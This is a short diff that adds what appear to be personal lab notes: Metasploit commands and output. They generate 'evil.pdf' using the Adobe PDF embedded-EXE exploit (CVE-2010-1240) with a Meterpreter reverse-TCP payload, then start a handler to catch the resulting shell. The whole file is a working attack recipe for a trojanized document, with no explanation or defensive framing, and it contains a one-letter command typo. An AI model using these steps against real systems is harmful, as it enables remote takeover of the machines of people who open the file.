@@ -1,0 +1,18 @@
+msfconsole 
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+show options
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.160.2
+exploit
+[*] Reading in '/usr/share/metasploit-framework/data/exploits/CVE-2010-1240/template.pdf'...
+[*] Parsing '/usr/share/metasploit-framework/data/exploits/CVE-2010-1240/template.pdf'...
+[*] Using 'windows/meterpreter/reverse_tcp' as payload...
+[+] Parsing Successful. Creating 'evil.pdf' file...
+[+] evil.pdf stored at /root/.msf4/local/evil.pdf
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.160.2
+exploint
+
+
